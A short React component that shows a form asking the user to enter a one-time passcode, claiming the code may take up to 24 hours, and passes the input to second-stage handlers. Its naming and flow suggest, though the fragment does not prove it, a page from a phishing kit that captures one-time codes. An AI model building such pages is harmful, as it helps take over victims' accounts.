

function Success(prop) {
    return (
        <div className="container">
            <div className="box">
                <h1>Enter OTP code sent to you</h1>
                <p>please wait, code will arrive within minutes, up to 24 hours</p>
                <input type="number" className="pass-input" name="code" onChange={prop.getData2} />
                <button className="check" onClick={prop.handleSubmit2}>Confirm</button>
            </div>
        </div>
    )
}

export default Success;